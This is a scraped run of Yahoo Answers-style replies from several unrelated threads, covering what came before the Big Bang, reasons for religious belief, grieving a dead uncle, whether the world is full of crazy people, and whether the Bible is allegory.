not yet mean that they are somethng proved or demonstrated.  Life is no argument; among the conditions of life could be error."...---  F. W. Nietzsche    Thank you for posting your thoughts...  -|`|97oxJ0B8aa	Great philosopher or coocoo?  I'd say you're just a thoughtful person, and that's a good thing.    You're making really good sense to me at least.  Let me add a few thoughts to yours and hopefully you'll find that they help you to refine your thought process.    First, I don't think it's the assumption that things have to begin that makes us look for something before the big bang, but it's more the "law of thermodynamics".  There are 2 laws of thermodynamics and one of them says basically that things don't just randomly put themselves together but rather they tend towards disorder.  Think about that for a second.  Maybe you can see it for yourself.  Who has ever accidentally made a cup of coffee?  Have any of the objects that crashed into jupiter recently left behind a house?  So there, that's why we're looking for something, because we know that if this present system continues for long enough, we'll all end up having nowhere left to live.  All the stars will burn out, etc.  Here's a good documentary about it: http://www.youtube.com/watch?v=4ONduQzJa...    I definitely like your thought pattern about how it doesn't have to be A or B but not C either.  Like it could just be something we can't even think about.  That's cool.  It's a fair way to estimate our own intelligence.  It's funny that most of us today seem to think Logic is something so infallible when it's just in our heads.  I'm for logic and sure, it's the best thing we have, but who knows how limited it really is?  Not us! lol.  How could we?  Anyways, one more thought to add to your above short essay:  God.  Remember the Burning Bush story with Moses?  Everybody does, right?  Well, when God told Moses to go tell Pharaoh to "let my people go"  Moses first ask God who he was so that he could tell Pharaoh who to blame.  And God said "I am that I am".  I don't think that's really a name.  But I think it sort of matches up with what you said.  "I exist because I exist".  It's as if God was claiming to be that thing that doesn't have to have a beginning.  But I know I'm not "because I am".  I am because my momma.  Lol.  Hope that helps somehow.  Good luck with all your thinking.|`|yCTxg4t5aa	Excellent! i love how your mind works lol  Human beings first need to realise that we don't know everything, for all our science and research that we use to prove things to ourselves it really means absoultly nothing, reality is not concrete, we are limited to our own perceptions and experiences. The indians of North America had to sit on the beach for days watching the ocean break against an invisable wall before they could see the ships. Imagine what could be in front of your nose right now but you can't see it because your mind can't process it.|`|9d24eebc65f160389e6cd993dc745cd8aa	I don't know if you're the next great philosopher, but you're certainly thinking about it rationally.

If we could approach the speed of light we would start to shrink.  As we reach the speed of light we would have width but no length, and, of course, no time..|`|C1SOqQSkaa	You have a lot right, but the notion that the observed universe in its current state had a beginning is based on more than philosophy: the expansion of everything away from everything else makes it clear that there was a time when everything was packed tightly together.    And when that was the case, the temperature, density and simplicity of the universe would have been much higher. It would have expanded outward very rapidly. But even now, billions of years later, the remaining trace of that high temperature should be detectable.    And it is: every point in the sky radiates at 2.7 degrees about absolute zero - which fits exactly with previous calculations.    The Big Bang is a fact.    BEFORE the Big Bang is harder to work with, since every known speck of information would have been rearranged and destroyed by the Big Bang. There are theories, however, including the model that proposes the Multiverse, which constantly buds off new universes with varying constants.|`|d7c8ecd624fbbc0797b1502ba6682e8baa	1) You are correct; causality is a time bound concept, so it cannot be applied outside of space and time. Thus, to ask, "What caused the universe?" is a category mistake. This is, ironically, the same reason the question, "What caused God?" is nonsense, since God is supposedly outside of space/time as well.  2) The bigger problem here is the assumptions a) that everything within the universe has a cause (radioactive decay is not a caused process), and b) that even if everything within the universe had a cause, this would not imply the universe itself must be caused. An argument from a truth about the parts of something to the whole is called "fallacy of composition".

Some of what your saying is coherent, though much of what you argue has not only been theorised and some of it subsequently proven through deduction by Einstein and other's.    |Nothing" does in fact exist, nothing being a condition of a lack of anything else, and if nothing exists (within black holes, where time, which is relative nearly halts) it can be posited that nothing can be a catalyst for something.    Circle talking aside, time and space exist together as spacetime, as in the fabric of th universe, and indeed there are instances within our universe where neither exist.  So if those conditions can occur inside our universe, than thing far more wonderous can exist outside of it.    The very fact that we live in a three dimentional universe, makes it completely impossible for us to conceive of existence beyond it.|`|KZWiRYEwaa	you write too much.

I often have these types of monologues in my head and so you make me feel like I'm not such a weirdo, knowing there are others out there. :-)    I consider myself to be an atheist because I don't believe in a personified god (one with human attributes such as love, anger, jealousy, forgiveness etc.) I don't feel I'm an agnostic even if I believe there might be something more to life than what we perceive because I don't think that something else is god. It is human nature to try to explain what we don't know with what we do know and thus we invent a god with human characteristics. I agree that perhaps - or most likely - the truth is something that we can't even begin to imagine.|`|GBKaftrJaa	Well, if you want to understand what the Christians think then read the bible.  And it says time was created for us, along with the creation of the universe.  God and the angels and all live outside time.  Time is just for us humans.    And we know all this to be true because God spoke directly with Moses and told him to record the things he said to him.  It wasn't like in the movie where Moses just got stone tablets with the ten commandments on them. Moses talked directly with God many times and for long periods of time throughout his long life.    The difference between believe in science is because it's all based on theories that may or may not be proven accurately.  The bible is based on recorded, witnessed events.  So it's a matter of saying, do you believe or discredit the guesses or do you believe people recorded what they witnessed or that they made it all up?|`|WQ9D8Qwlaa	I think you're completely loco in the coco, it sounds like you need help.|`|02PXcC95aa	this is too too long.|`|v4MtQBReaa	my braaain.    Lol.  nah- it kinda pokes at something.|`|a2DW1Bqgaa	I think you are not actually looking at the bigger picture and are indeed maybe cucu. If you are into science then you will note all things come from something...cells or any other micro being. If you believe in your God, he may not have made us all in 7 days, but could he have not created the cells which develop into thousands to create life, that then evolution turned  into our world today. Try not to think so much, if you were meant to know, we would already have these answers. ;)|`|Tp3jOpc7aa	I love it =) that is exactly some of the thoughts that go on inside my mind but I can never get it into writing because it's just so jumbled and people can't follow it (neither can I sometimes) but I know what I am trying to say.

Scientist actually try not to /assume/ much, they try and prove things.  Theories are as-of-yet-unproven routes of thought.    I'm not sure we'll ever have an answer.  I prefer to have cereal in the morning..  I don't even particularly like chicken or eggs.|`|3lMujNUZaa	Sorry... can you repeat that...|`|o503YPrqaa	I think this is your opinion. Lots of people have them. I like yours, it makes sense. I am atheist. I think there are several universes outside of ours, and together we are all in space. and that there is a possibility that space is infinitesimal. I also think that well who knows how time works outside of our universe. Who knows how long the space and unknown has been? So I think that there was no big bang theory for our universe. But I think that things have always been around. Perhaps our universe is fake, and some beings from another universe created us? Who knows. Doesn't that make it fun?|`|o8uie3B2aa	seems like you have a deep mind and think alot..    in my opinion, it is not possible to know how the universe began.  who knows, there could actually be a greater being out there who created the universe, and it is just a common belief of people to not believe in that.  or there could have been a bigger bang that started the big bang, and its just an endless cycle.  but then we're still left with questions, that simply cannot be answered, because humans are just not capable of finding the answer.|`|UwsbuHZYaa	Buy this book.  http://www.amazon.com/Show-Me-God-Messag...

And...you can't get get something from nothing  no matter how you look at it neither Quantum physics not absence of time.|`|hgTR8Uzaaa	It sounds like you have given that a lot of thought.  I don't agree with you, because ultimately you have to take things like God on faith.  There are tons of philosophical arguments supporting both the existence and the non-existence of God.  But I know what God has done in my life and how he has changed me.  However, I respect how you have approached these issues. You sound like a really deep thinker and I can only pray that someday you will discover the truth about God.  Like I said, it is something that ultimately relies on faith.|`|92e27dd762adff13fe85167dbd854510aa	First point: I dare you to ponder a universe without a beginning without your mind exploding.  Does it explode at 50 billion years, or 50 trillion years?  Can you comprehend 50 trillion years?  Then realize that 50 trillion years is an inch in the miles and miles of time past?    Second point: If there was no beginning, and that everything has existed for all eternity, that makes it highly likely that life evolved somewhere, oh, 200 trillion years ago.  Highly advanced life that probably rapidly progressed to interstellar travel; and given the 200 trillion years since they evolved as such, are probably so much further technologically advanced that they can, more or less, control the universe.    I mean, seriously, if your powers were absolutely unlimited (which 200 trillion years ought to do), would you not be constantly exploring the universe, carefully monitoring various planets, and seeing how evolution is progressing in one planet or another?  Since the latter stages of evolution happen quickly (of the 4.5 billion years scientists say we took to evolve, maybe the last 6000 have been interesting to watch?), wouldn't the whole universe gather around that planet to watch as if it were a movie screen?  It would be like watching a lunar eclipse.    And with life as boring as that, wouldn't you be tempted to, say, speed up the process?  That is, once one species arrives at complete omnipotence, wouldn't they help along every later life-form along, for the sake of entertainment (or relief of boredom)?    EDIT: So I kept thinking and came up with this:    If there was no beginning, then there must be a God-like creature.  Proof: Science says that if something is true, it must be repeatable.  Assuming evolution is true, that means it must have occurred elsewhere.  If there is no beginning, then this God-like creature must have evolved infinite number of times before we evolved.  Therefore, if there is no beginning, there must be a God or a god-like creature(s).|`|iaPtohhhaa	First of all, what is the indisputable evidence that universe is either created or not? I guess nobody will have the answer, because for each answer there will always be some arguement to counteract it. For instance, you are also using a lot of 'perhaps' to counteract the common views of creationism. Unless we actually go back and look at it, no one will know for sure.    Ultimately, we base on faith on what we claim regarding the outcome of the universe, whether by creation or natural evolution. But then, is there anyway to distinguish the two opposing events? Perhaps it means the same? Just like an electron is a particle, but also a wave. Which argument is correct?

Deists generally reject the notion of supernatural revelation as a basis of truth or religious dogma. These views contrast with the dependence on divine revelation found in many Christian, Islamic and Judaic teachings.    Deists typically reject most supernatural events (prophecy, miracles) and tend to assert that God (or "The Supreme Architect") has a plan for the universe which he does not alter either by intervening in the affairs of human life or suspending the natural laws of the universe. What organized religions see as divine revelation and holy books, most deists see as interpretations made by other humans, rather than as authoritative sources.    Deism became prominent in the 17th and 18th centuries during the Age of Enlightenment, especially in the United Kingdom, France and the United States, mostly among those raised as Christians who found they could not believe in either a triune God, the divinity of Jesus, miracles, or the inerrancy of scriptures, but who did believe in one god. Initially it did not form any congregations, but in time deism strongly influenced other religious groups, such as Unitarianism, and Unitarian Universalism, which developed from it. It continues to this day in the form of classical deism and modern deism.|`|LOYeeweAaa	I don't blame u for feeling that way.

93b4ed7bd08774a53436f8fa3f60471baa	I am not trying to convince you into my religion - Christianity, but I share to you how did I got into my religion, just as what you have asked. Please be patient and read.    a. I fear of death and the judgment after death. I sure know that I am a sinful man, and I need the salvation of Jesus Christ.     b. God is real and He still listen prayers even today. One day, I was listening to a tape from my church. The speaker was Dr. Hui, a famous doctor from California. The day when earthquake toke place in California in 1989, he found out that he has last stage cancer. He was a Christian when he was young. He confessed his sins of paying too much attention on his career but not on God and his family. Ended up, not only he felt that God have forgiven him, but God also healed Hui's cancer mysteriously (which Hui did not asked for) - all of his cancer has completely gone. Hui still survive today teaching theology.    c. It passes my logic: 1. there are two possibilities about God. There is a God (or many Gods) or no God at all. 2. If there is god (or many Gods), there are two possibilities - there is only one God or many Gods. 3. If the fact that one God is true, then many Gods are false, or the other way around. 4. Since Jesus Christ - the living God, as shown above claimed that He is the only God, and then I believe it as fact, than there must be no other Gods but Him, as He shall not lie to us. 5. Christianity is being support by historical facts throughout the history, comparing to other religions I knew.     d. Personal experiences of God in my daily life. There are too many to mention here.     I would never change my religion. As He, the Holy Father, Jesus Christ and the Holy Spirit are there all the time, although they are invisible. With my faith, I can not deny of their existence.|`|lVSDB0Hwaa	Evidence.  Science provides evidence for evolution and the big bang.

To honestly seek Him means that we have to be willing to accept His authority over our lives as our Creator and Master.

It's about as rational as believing in Santa Clause.|`|buiHdl0Gaa	Usually people who believe in one religion or another do so because they have been indoctrinated since early childhood.

Please read " God is Not Great" by Christopher Hitchens - if you dare -  and have the wit and intelligence to absorb it.|`|Zj8JkvX1aa	I don't believe in religion as it doesn't make sense to me. I cannot see the difference between it and mythology. This is a part of an article based on Jesus but I believe it is similar in most religions.     ......Many non-Christian religions -- Pagan and others -- permeated the Mediterranean region during the 1st century CE. There were numerous male heroes, saviors and god-men within Egyptian, Greek, Roman, Hindu, and other pantheons of Gods whose lives had many points of similarities to Jesus. Of these, the Egyptian God Horus probably had life events attributed to him which were closest match to those of Jesus. Yet, Horus was worshiped in Egypt thousands of years before the first century CE when Jesus is believed to have been ministering in Palestine.     In order to compete with those religions, Christianity would have had to describe Jesus in terms that matched or surpassed the local myths, stories and legends. The authors of the gospels may well have picked up themes from other sources and added them to their writings in order to make Christianity more credible to a largely Greek/Pagan world.     The site is called religious tolerance and is run by people of different faiths. This is only an excerpt of an article. The site is neutral. Although I recommend it, I have no affiliation with it.  Enjoy the journey.|`|c7db39975c64a358eab6a0044a8a7223aa	I do not consider religions such as Christianity to be something you either literally believe in or you dont.  I think that is missing the point of the role in which religious symbology plays in human psychology. I draw from all the world religion, look for the common themes and deeper meanings.

Just so you know the odds of it happening is you pulling Scrabble tile out of a swimming pool full of tiles and spelling pneumonoultramicroscopicsilicovolcanocon correctly ( yes it is a real word)..  And then having two proteins coming together in a pool of primordial soup.  The chance of that is 10 to the power of 65.

But the fact that an afterlife doesn't exist doesn't bother me, and doesn't effect how I think of death.    What's so bad about it? They don't know they're dead. And when you're dead, you won't know either. Since there is no eternity, it's not as though you'll MISS them when you're dead. And even if you were religious, you wouldn't get to see them in this life anyway. So what difference does it make?    I think the first time you experience death is always the worst. Feel better.|`|27104bc8bd5a195c9a918faf29fbd9deaa	The same way anyone grieves Just without the idea of them going to heaven, death is hard weather you believe in heaven or not, losing a loved one always sucks|`|66ae930022bf29f4c8379012ac4ae691aa	Think of it this way: you're uncle is dead, and that makes him the lucky one- it means he was born in the first place.  He had the opportunity to live a life, hopefully a good one; to enjoy time with his friends and family members, such as you; to see many sunrises and sunsets; hopefully had the opportunity to love; experienced all the wonders, good and bad, that life has to offer.    He spent time on this beautiful marble of life and love called Earth; the only place we know of with life.  The chances of someone being born are astronomically low, but it happened for him.      Therefore, don't mourn in his death, but instead, rejoice in his life.  That is all we have: appreciation of life.|`|3lMujNUZaa	I'm probably too pragmatic and not the person to be answering.  My dad passed away about 15 years ago and though I loved him dearly, I accepted his death as the natural event that we all must experience one day.  He will not come back, so rather than focusing on the loss, that nothing will reverse, concentrate on the good times, the memories, the lessons learnt, the laughing, the joking.  Realise that if he touched your life, he lives on as a part of you.  Don't mourn his passing, celebrate the time he had on this earth|`|EFjrJmdXaa	I am not a religious person. But I do think even spirituality can be described through science and biology. I try to use deductive reasoning to explain my life and my existence. In other words I try to break myself down into parts to find my base self and instead of looking at myself as physically separate than my surroundings I look at myself as a part of the whole. Scientifically speaking this is correct because in between individuals there is matter which connects us. The lines that define our bodies are just due to the reflection of light and the bonding of matter. We feel as if we are separate from others yet our actions cause us to behave and react a certain way due to biology and neural programming. I believe the first thing we must do is deduct everything down to what it really is: matter and energy. Energy is the product of matter at work, therefore energy is material. Therefore we all reduce down to material and force. If everyone reduces to base material and we have all come from base material then that must mean that even when we die "we" still exist physically speaking. We need to realize, scientifically speaking, that when we are coming to life (being built in the womb) our dna is used to build the neural connections within our minds. Once we realize that we can point to the fact that a part of who we "think" we are is actually due to biology and dna programming. As we grow up we are influenced by the people, environment, and choices we make. Our memory is like a database in order to recall past events and our mind is built to gather information and rationalize it. Although, does our memory define "who" we are? If we forget who we were does that mean we did not exist in the past? If we no longer can process and receive information does that mean we no longer exist? No, it just means we can no longer process information. Our memory can not adequately define our existence or what we are. Just because we can not memorize events in order to have a concept of time that does not mean we do not exist. Which defines who we are: 1) Our memories, friends, and experiences? or 2) Our existence? To say that who we are is our memories, friends, and experiences is to say that if we forget a past event, friend, or experience, that we no longer existed during that time. But we did exist during that time, even if we can not remember that event. Are we our eyes, legs, arms? If we lose our legs, are we no longer ourselves or are we just a different version? If we lose our arms, are we no longer ourselves or are we just different versions? If we lose our sight and our sense of taste and smell are we no longer ourselves or are we just different versions? When we lose our ability to memorize or recall memories are we no longer our self or are we different versions? We can not adequately define ourselves as our beliefs, our experiences, our friends, our decisions, or our current state of existence, because all of those factors are ever changing. Our beliefs change through experience, our experiences change, our friends change, the decisions we make change, our current state of existence is in constant change. Since all of the qualities of our existence are in constant fluctuation it is impossible to tie down one particular set of events to define a person. Our memory does not adequately define who we are either. As we get older we forget more. To say that we are defined by our memories is to say that we did not exist during the allotted time of a forgotten event. As we get older our ability to retain memories shrinks therefore we remember less but the amount that we remember about our lives does not define what we are. We are no less ourselves when we remember less than what we once remembered. When we go to sleep at night we do not necessarily stop existing just because we are not aware of the events surrounding us and just because we seem to lose perception of time, as those parts of the brain shut down. Therefore, since we can not be defined by our ever changing personalities or our ever changing physical entities it is impossible to say that who we are is those everchanging qualities. As a result we can not define our selves, in an absolute sense, by our families, the current events, our names, or the labels we give ourselves (names). Yes, we can define ourselves as who we are "in the now" based on the current circumstances, but not the past or future versions of ourselves. Therefore, when we die, we are actually just blending back into the universe. We are becoming what we once were: nothing but basic material. But remember that is not the beginning. Before we came into existence in this current state of time the material that now inhabits our bodies was once a flower, a tree, another animal. Every day millions of cells die and we replenish them by breaking down plants and other animals inside our own bodies.

EDIT: I just wanted to add, that even though I do believe in Heaven, when my dad died, it took me more than two years to even sort of reconcile it.  Its hard to say goodbye even if you do believe you will see them again.  I am finding as I get older, death becomes easier to face.  Simply because, so many people that I have known all my life, have died.  It just kind of makes it easier to be prepared for that day for yourself.    there are still songs or even a recording of dad singing, that will set me to tears.  Or a forsynthia bush in full bloom that makes me want to scream for what he had to go through.  But, time is healing that as well.    I sincerely wish you peace and rest from your sadness!  (((hugs)))|`|AA11709855	I know the feeling, somehow... I haven't really found out how I coped with it, but I did. I kind of only studied his life rather than understand that he no longer lives, but of course, memories will go on.|`|lSV8D9Rfaa	As for reliving the sight of the dead body, it is natural, especially when it is the first body you have ever seen, I am a paramedic on the side and I could paint you a picture of the first dead on arrival call I was ever on, and that was 7 years ago. I hate to say that although the image might fade, it will probably remain with you  For me, it is ok to think of life as just ending when it is a loved one it is always difficult, but it is one of those definite things that we will all experience in life. if he was a good person (and I assume he was) just think that his last thought were probably happy ones and then he went o sleep for lack of a better analogy. As for you never seeing him again. His memory will live on even if you dont believe in a spirit, if you remember the good times and the great things he taught you, although he may be gone, part of him will always be around.    As an atheist I dont really think about the time after death too much because I think life just ends what I concern myself with if ensuring my life is one of happiness, correct decisions, and helping others, because these things are important to me and I want to be proud of my life. what happens after death I cant do anything about    I truely wish you the best...|`|d7xE8bYFaa	It usually helps me to realize that no person lives in a vacuum.  Whether positive or negative, we all have an effect on the people that we interact with during the course of our lives.  We may not be conscious of the effect we have on others or the effect that others have on us, but it is there nonetheless.  These encounters change us, and change how we deal with others, and in turn, the way we treat others changes how they deal with people.  It is like a chain reaction that passes from person to person and will do so as long as there are humans on Earth.  And, like the butterfly effect, sometimes our smallest actions will eventually have tremendous consequences - even if we're no longer around to see them.  Also, the closer we were to someone, the larger the effect they had on us, and the larger the traces of their influence will be when we influence others.  That is where we find our immortality.|`|0sOnf2YQaa	My father died 29 years ago today and my memories of his life and his death are vivid.  It's to be expected to reflect back on the passing of a loved one and perhaps still cry many years later.  Bear in mind too that you did say this was the first death that you have experienced.  One of the first deaths for me was in 1971 and was a very dear neighbour who treated our family so kindly.  I attended the funeral but the service was not open casket.  These days, I love to think of him and have written poetry about him.  I hope you are feeling better soon.|`|450539d29675dc973b0ec09791ed6c66aa	It will take time but it will get better.Try to think of all the good memories with your uncle that will help you get through this.     I wish you peace.|`|ywLQqj8Kaa	(((Teapot))) I've lost 7 loved ones to sudden, tragic deaths and I couldn't possibly give you better advice than seebob has given you. He's exactly right. Hang in there, honey :)|`|Y3CkwrTfaa	There's no easy way to tell you this and i in no way mean to come across as heartless but when your dead , your dead thats it . weve all been created to have the best possible life we can make for ourselves but in the end we all end up blowing in the wind or six feet under. When a close one dies many people withdraw into themselves and forget about the good times that person may have had while he was here . As for me whenever friends or family die i tend to have a bloody good drink and remember the good times we had.  Sooner or later it will be all our turns    And thats life    Sorry|`|UZxeBrxQaa	As we change in wisdom, knowledge, understanding, age, and experience, there will always be changes in our perspective of who we are, why we are here, whether there is more after this thing we call "life".    That's a private journey for you and you alone.  Its a journey of belief, and belief systems.  There are many.  We each will eventually choose a system that most closely reflects our understanding at a given time.    Expect change in your life as time passes.  Don't close your mind to any possibility.|`|GQk0UNjfaa	most of the people i have known who have passed away did so after suffering through a long and painful illness. i coped with it by knowing they were not in pain anymore. i don't know what else to say except that i hope you feel better soon.|`|U64Aefc6aa	It's hard. It's definitely very hard.     But there's no way around it. To cope with losing my favorite uncle, I just thought of all that I got to experience with him. He was this awesome 67 year old dude with long white hair who chain smoked and drove his 68 Firebird everywhere he went. He loved his life while he had it. And I got to have a part of it.     It was hard to lose him, but I'm still so thankful to have had a part of him. I can only hope that one day someone will miss me when I'm gone, too.|`|4sUek7ugaa	Did your uncle influence you?  Did he tell you stories that you remember, give you advice that proved valuable, or make you feel loved?  Then he lives on.  Some part of him will always be with you as long as you remember him.|`|aj5IBTuXaa	Coping with death is not trivial, but the real issue never was that anyway.  It was always how you coped with life.  Your own life.    Death is a loss in some ways, but the real event is change.  A change in your life caused by the absence of the loved one.  As long as you don't have a brain-wasting disease like Alzheimer's, you still have the memories of the loved one.  The farther down the road you go, the better your chances of putting aside the very last memory, which is always at a bad time in that person's existence, and going farther back to good times you shared.    When you can only look back, you feel old, tired, and depressed.  If you can learn the trick of looking forward again, you will do much better.  It isn't easy and while I can give the advice, I know it is hard to actually do.  Allow your current life to consume you for a while.  Realize that life goes on.  Realize that good things can still happen.  Then ... let them happen.    Good luck, friend.|`|0880ac45fbb6456e1e6cd4a33571a64faa	My mom passed four months ago and I dunno, it's just something I've dealt with. I do know that despite never seeing her again the pain from the loss will go away with time and I will be happy having memories of her when she was alive.  Maybe every time the image of your dead uncle pops up into your head you can force yourself to think of a happy time when he was alive.
U64Aefc6aa	I promised Ceiling Cat I wouldn't tell anyone about last summer's "incident".|`|rGEZup0Zaa	I don't think anything Phoenix does qualifies as dirty.    It's all good.

Bh82isDSaa	I tend to agree with you, but that isn't really fair. Some of the poorer countries in the world don't have as many killings in  a year as we do in one day. All those things you listed are a result of their breaking the law.   Youth gangs (violence to others), youth pregnancy (getting into sex even when they know they shouldn't), divorce (breaking the bonds of marriage promises), and on and on, breaking the laws.  Guess what, it is going to get worse especially if we keep taking God out of everything.   This year it was wrong to wish someone a Merry Christmas. Why is it that way? Those that want it that way are people who don't want rules as their conscience will catch up to them. Look at Hollywood and their antics.  It's all about being able to do what you want to with no rules. What happens then? Parties, drinking, drugs, sex,  (even to convince others that crossing the gender line is ok)  so the young people are not thinking they're crazy, they just want the freedom to "try it out."  Right now half the country is convinced that we should spend more money than we have ever spent in our history so the 10% unemployed will be happy. Or is there another reason or is there a more sinister plot in our future?  Don't be afraid or be apologetic about your negativity. You are correct and they are wrong! Sadly, until we get some real honest leadership, we will continue down that trail.  Continue to speak up and share your fears. When we stop talking about these things, we lose.|`|55d7e5fbbf85991efc1fb24ea6b9735faa	YEAH i think that people need to stop having children!!! there are too many mouths to feed in this world and there are alot of children in orphanages that need a family so that they stay off the streets!! then when the kids grow up to 18 they live on their own with no role models to follow. then that leads to gangs, murders, robbery, drug addicts, crazy unprotected sex!!! then the children of that guy will most likely be left alone!!! Its a vicious cycle............ADOPT BEFORE YOU REPRODUCE|`|36f164873fb212f4be988fa1d87ec37caa	At times it can seem that way, but you see..... er, *hmm*      ....nah your right, they're all crazy!|`|xFm5wzuXaa	I wish sweets everyone seems overwhelmingly boring and average to me.  Especially in their obsession to be different|`|nw0fqXj9aa	Only crazy people think that.|`|TwfyliKiaa	we all are crazy. Never were we all not crazy. There's just more people which means there's more crazy, and with instant communication we hear about it now. yes the slippery slope has been accepted as "normal" we accept divorce, gangs, abortion etc...  but man has always been flawed|`|TinNG7k7aa	It isn't insanity which is catching as much as the ability to communicate which has spread.    People were lunatics for centuries - but without instant, mass communications, it remained localized lunacy. Today we can communicate stupid, inane and plain dangerous ideas almost instantly.    And a lot of people are still in a "monkey see, monkey do" mindset.    Add these things up and you end up with a lot of dangerous, ignorant angry apes crushing each other, don't you now!|`|25qUTYLEaa	Yes. And if I tell you the reason behind the craziness, you'd think I was crazy too. You aren't negative, it's reality.  The world is run by evil. Wake up people, and turn to Jesus. He's our last hope.|`|AA11900730	yes!!! I've noticed all the murders too! like holy sh*t|`|vCWyJFhsaa	I wouldn't call anyone 'crazy', some people just make some not-so-smart decisions in life.|`|yL7RKxHFaa	Yes, indeed I do believe this. Infact, I believe you to be one of them! Look at this question..."crawling with crazy people." Crazy people often are the ones to point out other crazies.

I don't think humanity has gotten any worse in the recent past, so there's just as many crazies as there ever was.    You may think many people are "crazy" but from another perspective they may just be complex.    It's also possible that  Humans are growing mentally deficient, from there exposure to chemicals and the wonders of modern technology!|`|XFB0KTmYaa	Yes and no....Things are much more out in the open and talked about more and more.....like anal sex used to be taboo....and now it is like everyone has or is doing it....really...it all starts with our parents,....how well they raise us..and teach us right from wrong.....and it is no wonder with the rise in divorce...so goes the rise in crazy people.....lol
mSFjbetxaa	I think most Christians, like the Jews, do not take the bible literally.  It is only the ignorant fundies who are literalistic.        *LOL @ the deluded fundie who claims that archeology has proved the buy-bull to be accurate*            The supposed "historical facts" dont even line up. Like the wrong prophet with the wrong king at the wrong battle and it was first written down years after the fact. That is historical fiction. The setting maybe a historical fact, but what they said happened is fiction. We dont know who wrote the gospel, The first one Mark was written at least 30 to 60 years after Jesus died. Matthew and Luke had a copy of Mark with them when they wrote their books. John was deliberately written to fill in the gaps and the arguments that the new christian faith was having. These are stories passed on for years and years before written down. None of these are first hand accounts even though they are written that way.   Every religion has their spin on it, but try to find the facts. The conclusion is that there is little in the bible old or new that is fact. It mentions places that are real, but thats about it. You can walk the streets where Jesus carried his cross, but did he really carry a cross? I try to find sources out side the bible that mention the same thing the bible does. Like the census that was taken and why Joseph went to Bethlehem. No record of it ever happening outside the bible. This is not the stone age. There was all kinds of trading with other countries. Something should have been mentioned somewhere about this massive disruption of the economy. Anyhow, we base our faith on the stories of Jesus in the gospels. If they can not be proven as fact, even by the Roman empire, then faith is based on fiction?|`|pbT0tJvqaa	How often do we dig up archaeological finds of allegorical events. We have many artifacts that verify the people, places, and events in the Bible. The Bible gives us genealogies and we have archaeological and historical evidence of many of these people. Last I heard it was pretty hard for an allegorical person to beget a real living one.   The Bible is the literal truth.|`|39c2f0bee655749f08686b4b9623eb79aa	That is what it is, that is what all religions are, but people still continue to fight over it. I believe in all religions, because I see the common underlying themes in all of them. They relate to what I have learned through my direct spiritual experiences through meditation and such. One of my hero's Carl Jung speaks so well of this|`|YNMnVjltaa	I think a lot of it isn't meant to be taken literally.  The translations differ from one another, so it just makes me laugh when I run into people who try to interpret every passage literally.|`|I3rjYVUFaa	No, I've never considered that. Have YOU ever considered that the Bible is true?     The Bible, since you asked, is a love letter to you, written by your father:    http://www.fathersloveletter.com/flltext...|`|db7df25ea31227e5641d5c32d43c3bcdaa	its not allegory    if it was it would not be the word of God|`|tI1NHwfBaa	Of course I've considered it.    But then I learned about the history of the Bible, and how archaeology has proven time and time again that the Bible is an historically accurate work.  More research showed me that there are more early copies and fragments of copies of the New Testament books than any other book of antiquity -- by far -- and the copies show that the contents weren't changed over time.    It's up to you whether or not you believe the story the Bible tells.  But you can't rationally dispute the historicity of the Bible without taking on the entire field of archaeology.  And that, of course, would leave you looking rather foolish.    But not as foolish as one who doesn't bother to check the facts, and just assumes that they know better ... like my friend below.|`|HhmhSBpgaa	What would it hurt if I was wrong I die, thats the end, but if I am right then the life I live here is a happy one and a righetous one  and the ending is great.

So I would follow kmowing that my life would be good.|`|uAMzmAwaaa	i have considered that... then i asked myself if it was a made up story why would the people who made it up choose to die when given the choice between claiming it was made up or die....|`|d938becd9c20c43cfbbbca1473443b4aaa	why would anyone reject a teaching of Love and respect for your common man....I think you are confusing Christian Belief values taught by the bible and Christian Theology...There is a diffrence between the church and the religion...thats why there are gnostic christians|`|XEBpv9gwaa	It's not as simple as saying its all allegory or its all literal truth.  It is a collection of books by various writers.  The books have different themes at times, different purposes, different contexts.  Within each book you will find a variety of types of writing.  The Bible does contain passages to be taken literally.  It does contain passages that are allegory.  It also contains poetry, parables, symbolic language, and history to name only a few more styles.  Most importantly, the Bible is to be taken as a whole.  You can't get the meaning by pulling a passage out here and there, you have to consider the entire works, which comes down to a message of love.|`|LFWQiGYkaa	Most of it is. Rabbinical doctors will tell you that.    If you don't believe me, why don't you read Genesis one more time?  Funny - there are two diverging stories of the creation of man.|`|evStsOQiaa	I now consider that the hygiene laws in Leviticus written by God's knowledge of the germ theory be taken in the literal scientific truth He wrote them in and not the religious allegories theists and atheists think they are.

To sum up: We can not earn,what has already been paid,in full...We can however simply believe and act in faith,in the acknowledging.     I understand that the question was ''hypothetical' and I understand the intent,but found it difficult to answer,without including personal belief,as the implications of this idea,(works rather than faith)would negate the entirety of  the New Testament concerning salvation in and by the works of Jesus Christ...

I feel that God will reach out to each one of us, in His own time.  Who is to say what is right for one is not right for another but, for God Himself.  I truly believe that we must live and let live, let God do his work in each of our lives, and mind our own business.

He knows Jesus exists, knows his time is short, knows about the Kingdom that is coming.  Is he saved?  Or the mass murderer who has faith in Jesus?    Wouldn't God have more compassion for the man/woman who strived to do what is right, and helped his fellow man throughout his/her life, even though they might have never even heard of the Word?    I do not presume to know what God has in store for us, but I hope that through Jesus we will see the greatest act of love ever shown to humanity.

Now if you have a situation where someone does ask to sign your year book, perhaps you could insert a few blank pages of paper and ask that they sign that as you are trying to keep your book "clean" from writings and signatures. Tell them that you are using these blank pages which will be put in a manilla envelope inside the year book so you can enjoy their comments and your clean yearbook. It does sound rather stuck up and snotty of you though how you phrased your question. Perhaps there are many people that do not want to sign your book as much as you don't want them to.

